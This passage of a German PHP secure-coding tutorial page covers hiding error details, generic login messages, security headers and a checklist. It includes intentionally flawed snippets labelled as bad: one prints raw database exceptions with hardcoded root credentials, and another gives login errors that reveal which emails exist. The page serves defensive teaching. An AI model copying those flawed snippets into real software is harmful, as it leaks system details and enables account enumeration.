+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="cross-list">
+                            <li>NIEMALS Nutzer-Dateinamen direkt übernehmen</li>
+                            <li>NIEMALS nur Extension prüfen – immer auch MIME-Type</li>
+                            <li>NIEMALS in öffentliches Verzeichnis mit PHP-Ausführung speichern</li>
+                            <li>Immer Dateigröße limitieren</li>
+                            <li>Bei Bildern: getimagesize() nutzen, nicht nur MIME-Type</li>
+                        </ul>
+                    </div>
+
+                </section>
+
+                <!-- Error Handling -->
+                <section class="tutorials-content">
+                    <h2 id="error-handling-und-information-disclosure">Error Handling und Information Disclosure</h2>
+
+                    <p>Zu detaillierte Fehlermeldungen können Angreifern wertvolle Informationen liefern.</p>
+
+                    <h3 id="was-du-nicht-tun-solltest">Was du NICHT tun solltest</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">NIEMALS SO!</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red)" role="img" aria-label="Extrem gefährlich">
+                                <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// ❌ Gefährlich: Zeigt Datenbankstruktur und Pfade
+try {
+    $pdo = new PDO('mysql:host=localhost;dbname=secret_db', 'root', 'password123');
+} catch (PDOException $e) {
+    echo "Fehler: " . $e-&gt;getMessage(); // ❌ Nie so!
+    // Ausgabe könnte sein: "SQLSTATE[28000]: Access denied for user 'root'@'localhost'"
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="richtige-fehlerbehandlung">Richtige Fehlerbehandlung</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="25" height="25" class="icon-success icon-va-y-6 icon-small" fill="#20a66e" aria-hidden="true">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z">
+                                    </path>
+                                </svg> PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// ✅ Entwicklung: Detaillierte Fehler anzeigen
+if ($_ENV['APP_ENV'] === 'development') {
+    error_reporting(E_ALL);
+    ini_set('display_errors', '1');
+} else {
+    // ✅ Produktion: Fehler loggen, nicht anzeigen
+    error_reporting(E_ALL);
+    ini_set('display_errors', '0');
+    ini_set('log_errors', '1');
+    ini_set('error_log', '/var/log/php-errors.log');
+}
+
+// Bei Datenbankfehlern
+try {
+    $pdo = new PDO(/* ... */);
+    // Queries...
+} catch (PDOException $e) {
+    // In Log schreiben
+    error_log('DB Error: ' . $e-&gt;getMessage());
+    
+    // Nutzer sieht nur:
+    die('Ein Fehler ist aufgetreten. Bitte versuche es später erneut.');
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="custom-error-handler">Custom Error Handler</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// error-handler.php
+
+function customErrorHandler($errno, $errstr, $errfile, $errline) {
+    // In Log schreiben
+    $logMessage = sprintf(
+        "[%s] Error %d: %s in %s on line %d",
+        date('Y-m-d H:i:s'),
+        $errno,
+        $errstr,
+        $errfile,
+        $errline
+    );
+    
+    error_log($logMessage);
+    
+    // In Produktion: Generische Fehlermeldung
+    if ($_ENV['APP_ENV'] === 'production') {
+        echo "Ein Fehler ist aufgetreten.";
+        exit;
+    }
+    
+    return false; // Default Error Handler auch ausführen
+}
+
+set_error_handler('customErrorHandler');
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Was verrät zu viel?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>Datenbankfehler:</strong> Tabellennamen, Spaltennamen, SQL-Queries</li>
+                            <li><strong>PHP-Fehler:</strong> Dateipfade, Server-Konfiguration</li>
+                            <li><strong>Login-Fehler:</strong> "Email nicht gefunden" vs. "Falsches Passwort"</li>
+                            <li><strong>Stack Traces:</strong> Code-Struktur, verwendete Libraries</li>
+                        </ul>
+                    </div>
+
+                    <h3 class="info-title" id="login-fehler-richtig-machen">Login-Fehler richtig machen</h3>
+                    <div class="pb-sm">
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-lang">Gut</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-success" fill="#20a66e" aria-hidden="true">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z">
+                                    </path>
+                                </svg>
+                            </div>
+                            <pre><code class="language-php">&lt;?php
+// ✅ Gut: Generische Meldung
+if (!$userExists || !password_verify($password, $hash)) {
+    echo "Ungültige Anmeldedaten.";
+}
+?&gt;</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">Schlecht</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red-light)" aria-hidden="true">
+                                <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// ❌ Schlecht: Verrät, ob Email existiert
+if (!$userExists) {
+    echo "Diese E-Mail ist nicht registriert.";
+} elseif (!password_verify($password, $hash)) {
+    echo "Falsches Passwort.";
+}
+?&gt;</code></pre>
+                    </div>
+
+                </section>
+
+                <!-- Headers -->
+                <section class="tutorials-content">
+                    <h2 id="security-headers">Security Headers</h2>
+
+                    <p>HTTP-Security-Headers sind eine zusätzliche Schutzebene. Sie werden vom Server an den Browser
+                        gesendet.</p>
+
+                    <h3 id="wichtige-security-headers">Wichtige Security Headers</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// security-headers.php - Am Anfang jeder Seite einbinden
+
+// 1. Verhindere MIME-Type-Sniffing
+header('X-Content-Type-Options: nosniff');
+
+// 2. XSS-Schutz aktivieren (veraltet, aber schadet nicht)
+header('X-XSS-Protection: 1; mode=block');
+
+// 3. Clickjacking-Schutz
+header('X-Frame-Options: DENY'); // Oder: SAMEORIGIN
+
+// 4. Erzwinge HTTPS
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+
+// 5. Content Security Policy (anpassen an deine Needs!)
+header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:");
+
+// 6. Referrer Policy
+header('Referrer-Policy: strict-origin-when-cross-origin');
+
+// 7. Permissions Policy (früher Feature Policy)
+header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="header-bedeutungen-im-detail">Header-Bedeutungen im Detail</h3>
+
+                    <h4>Content-Security-Policy (CSP)</h4>
+                    <p>Definiert, welche Ressourcen geladen werden dürfen:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// Beispiel: Erlaube nur eigene Scripts und Styles, externe Bilder
+header("Content-Security-Policy: 
+    default-src 'self';
+    script-src 'self' https://cdnjs.cloudflare.com;
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' https: data:;
+    font-src 'self';
+    connect-src 'self';
+    frame-ancestors 'none'
+");
+?&gt;</code></pre>
+                    </div>
+
+                    <h4>X-Frame-Options</h4>
+                    <p>Verhindert, dass deine Seite in iframes eingebettet wird (Clickjacking-Schutz):</p>
+                    <ul class="arrow-list grid-2col-bg">
+                        <li><code>DENY</code> – Keine iframes erlaubt</li>
+                        <li><code>SAMEORIGIN</code> – Nur eigene Domain darf einbetten</li>
+                    </ul>
+
+                    <h4>Strict-Transport-Security (HSTS)</h4>
+                    <p>Erzwingt HTTPS für eine bestimmte Zeit:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// 1 Jahr HTTPS erzwingen, inkl. Subdomains
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
+?&gt;</code></pre>
+                    </div>
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">HSTS Vorsicht!
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Setze HSTS nur, wenn du <strong>sicher bist</strong>, dass deine Seite immer über HTTPS
+                            läuft. Mit <code>preload</code> wird deine Domain in Browser-Listen eingetragen – Rückgängig
+                            machen kann Monate dauern!</p>
+                    </div>
+
+
+                </section>
+
+                <!-- Security-Checkliste -->
+                <section class="tutorials-content">
+                    <h2 id="security-checkliste">Security-Checkliste</h2>
+
+                    <div class="grid-2col mb-lg">
+                        <div class="grid-2col-bg">
+                            <h3 id="input-validierung-output-encoding">Input-Validierung &amp; Output-Encoding</h3>
+                            <ul class="arrow-list">
+                                <li>Alle Nutzereingaben mit <code>htmlspecialchars()</code> ausgeben</li>
+                                <li>SQL-Queries nur mit Prepared Statements</li>
+                                <li>Formulardaten validieren (Typ, Länge, Format)</li>
+                                <li>Whitelists statt Blacklists verwenden</li>
+                            </ul>
+                        </div>
+                        <div class="grid-2col-bg">
+                            <h3 id="authentication-sessions">Authentication &amp; Sessions</h3>
+                            <ul class="check-list">
+                                <li>Passwörter mit <code>password_hash()</code> hashen</li>
+                                <li>Session-ID nach Login regenerieren</li>
+                                <li>Secure, HttpOnly, SameSite Cookie-Flags setzen</li>
+                                <li>Rate Limiting für Login-Versuche</li>
+                                <li>Session-Timeout implementieren</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <p>Hier ist deine Checkliste für sichere PHP-Anwendungen:</p>
+
+                    <div class="grid-2col mb-lg">
+                        <div class="grid-2col-bg">
+                            <h3 id="input-validierung-output-encoding-1">Input-Validierung &amp; Output-Encoding</h3>
+                            <ul class="check-list">
+                                <li>Alle Nutzereingaben mit <code>htmlspecialchars()</code> ausgeben</li>
+                                <li>SQL-Queries nur mit Prepared Statements</li>
+                                <li>Formulardaten validieren (Typ, Länge, Format)</li>
+                                <li>Whitelists statt Blacklists verwenden</li>
+                            </ul>
+                        </div>
+                        <div class="grid-2col-bg">
+                            <h3 id="authentication-sessions-1">Authentication &amp; Sessions</h3>
+                            <ul class="check-list">
+                                <li>Passwörter mit <code>password_hash()</code> hashen</li>
+                                <li>Session-ID nach Login regenerieren</li>
+                                <li>Secure, HttpOnly, SameSite Cookie-Flags setzen</li>
+                                <li>Rate Limiting für Login-Versuche</li>
+                                <li>Session-Timeout implementieren</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="grid-2col mb-lg">
+                        <div class="grid-2col-bg">
+                            <h3 id="csrf-schutz">CSRF-Schutz</h3>
+                            <ul class="check-list">
+                                <li>CSRF-Tokens in allen Formularen</li>
+                                <li>Token-Validierung mit <code>hash_equals()</code></li>
+                                <li>SameSite-Cookie-Attribut nutzen</li>
+                            </ul>
+                        </div>
+                        <div class="grid-2col-bg">
+                            <h3 id="file-uploads">File Uploads</h3>
+                            <ul class="check-list">
+                                <li>MIME-Type UND Extension prüfen</li>
+                                <li>Dateigröße limitieren</li>
+                                <li>Sichere Dateinamen generieren</li>
+                                <li>Upload-Verzeichnis außerhalb Web-Root oder PHP-Ausführung deaktivieren</li>
+                                <li>Bei Bildern: <code>getimagesize()</code> nutzen</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="grid-2col  mb-lg">
+                        <div class="grid-2col-bg">
+                            <h3 id="configuration">Configuration</h3>
+                            <ul class="check-list">
+                                <li><code>display_errors = Off</code> in Produktion</li>
+                                <li>Fehler in Log-Datei schreiben</li>
+                                <li>HTTPS verwenden (Let's Encrypt ist kostenlos!)</li>
+                                <li>Security Headers setzen</li>
+                                <li>PHP und Libraries aktuell halten</li>
+                            </ul>
+                        </div>
+                        <div class="grid-2col-bg">
+                            <h3 id="database">Database</h3>
+                            <ul class="check-list">
+                                <li>Prepared Statements für alle Queries</li>
+                                <li>Separater DB-User mit minimalen Rechten</li>
+                                <li>Keine Root-Credentials in Code</li>
+                                <li>Sensitive Daten in .env-Datei (außerhalb Web-Root)</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="grid-2col-bg">
+                        <h3 id="best-practices">Best Practices</h3>
+                        <ul class="check-list">
+                            <li><code>declare(strict_types=1)</code> nutzen</li>
+                            <li>Nie Nutzereingaben vertrauen</li>
+                            <li>Principle of Least Privilege (minimale Rechte)</li>
+                            <li>Defense in Depth (mehrere Schutzebenen)</li>
+                            <li>Code-Reviews und Security-Audits</li>
+                        </ul>
+                    </div>
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Ressourcen für weitere Infos
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>OWASP Top 10:</strong> <a href="owasp.org/www-project-top-ten/" target="_blank">owasp.org/www-project-top-ten/</a></li>
+                            <li><strong>PHP Security Guide:</strong> <a href="phptherightway.com/#security" target="_blank">phptherightway.com/#security</a></li>
+                            <li><strong>Security Headers:</strong> <a href="securityheaders.com" target="_blank">securityheaders.com</a> (zum Testen)</li>
+                            <li><strong>Have I Been Pwned:</strong> <a href="haveibeenpwned.com">haveibeenpwned.com</a>
+                                (Passwort-Leaks prüfen)</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <!-- Security-Checkliste -->
+                <section class="tutorials-content">
+                    <h2 id="zusammenfassung">Zusammenfassung</h2>
+
+                    <p>Sicherheit ist kein einmaliges Feature, sondern ein fortlaufender Prozess. Die wichtigsten
+                        Takeaways:</p>
+
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Die goldene Regel
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p class="text-lg">VERTRAUE NIEMALS NUTZEREINGABEN!</p>
+                        <p>Alles, was von außen kommt, ist potentiell gefährlich. Validiere, bereinige, escape – immer
+                            und überall.</p>
+                    </div>
+
+                    <div class="grid-2col">
+                        <div class="grid-2col-bg">
+                            <h3 id="die-haeufigsten-fehler">Die häufigsten Fehler</h3>
+                            <ul class="arrow-list">
+                                <li>Direkte Ausgabe von <code>$_GET</code>, <code>$_POST</code> ohne Bereinigung</li>
+                                <li>SQL-Queries mit String-Concatenation statt Prepared Statements</li>
+                                <li>Fehlende CSRF-Tokens in Formularen</li>
+                                <li>Passwörter im Klartext oder mit veralteten Hashes (MD5, SHA1)</li>
+                                <li>Zu detaillierte Fehlermeldungen in Produktion</li>
+                                <li>Unsichere Session-Konfiguration</li>
+                                <li>File-Uploads ohne Validierung</li>
+                            </ul>
+                        </div>
+                        <div class="grid-2col-bg">
+                            <h3 id="das-security-mindset">Das Security-Mindset</h3>
+                            <p>Denke immer wie ein Angreifer:</p>
+                            <ul class="arrow-list">
+                                <li>Was passiert, wenn ich hier <code>&lt;script&gt;</code> eingebe?</li>
+                                <li>Kann ich mit manipulierten URLs auf fremde Daten zugreifen?</li>
+                                <li>Was passiert, wenn ich riesige Dateien hochlade?</li>
+                                <li>Kann ich SQL-Befehle in dieses Feld eingeben?</li>
+                                <li>Kann ich CSRF-Angriffe durchführen?</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Nächste Schritte
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Sicherheit ist ein weites Feld. Weitere wichtige Themen:</p>
+                        <ul class="arrow-list">
+                            <li><strong>Two-Factor Authentication (2FA)</strong></li>
+                            <li><strong>OAuth &amp; JWT</strong> für moderne APIs</li>
+                            <li><strong>Security Testing</strong> (Penetration Testing, Vulnerability Scanning)</li>
+                            <li><strong>Logging &amp; Monitoring</strong> für Angriffserkennnung</li>
+                            <li><strong>Dependency Management</strong> (Composer, npm) – Updates!</li>
+                        </ul>
+                    </div>
+
+                    <p>Sichere Programmierung ist keine Raketenwissenschaft, aber sie erfordert Aufmerksamkeit und
+                        Disziplin. Die hier vorgestellten Methoden decken die wichtigsten Angriffsvektoren ab. Nutze sie
+                        konsequent, und deine Anwendungen werden deutlich sicherer sein!</p>
+                </section>
+
+
+                <!-- Prev/Next Navigation -->
+                <section class="tutorials-content">
+                    <nav class="tutorial-nav">
+        <div class="tutorial-nav-prev">
+            <a href="/tutorials/php/php-basics/php-basics.html">
+                <span class="tutorial-nav-label">← Vorheriges</span>
+                <span class="tutorial-nav-link">PHP Basics – Die Grundlagen</span>
+                <span class="tutorial-nav-category">PHP Basics</span>
+            </a>
+        </div><div class="tutorial-nav-next"></div></nav>
+                </section>
+
+            </div> <!-- Wrapper .container -->
+
+        </div> <!-- Tutorial Layout -->
+
+    </main>
+
+    <!-- Footer-Start -->
+<footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <p class="footer-text">© <span id="currentYear">2025</span> DevPanicZone. Alle Rechte vorbehalten.</p>
+            <nav class="footer-nav">
+                <a href="/impressum.html">Impressum</a>
+                <a href="/datenschutzerklaerung.html">Datenschutz</a>
+            </nav>
+        </div>
+    </div>
+</footer>
+<!-- Footer-End -->
+
+    <button id="scrollTopBtn" title="Nach oben">↑</button>
+    <script src="/assets/js/main.js" defer></script>
+    <script src="/assets/js/code-copy.js" defer></script>
+    <script src="/assets/js/sidebar.js" defer></script>
+    <script src="/assets/js/scroll-spy.js"></script>
+    <script src="/assets/js/search.js"></script>
+    <script src="/assets/vendor/prism/prism.js" defer></script>
+
+
+
+</body></html>
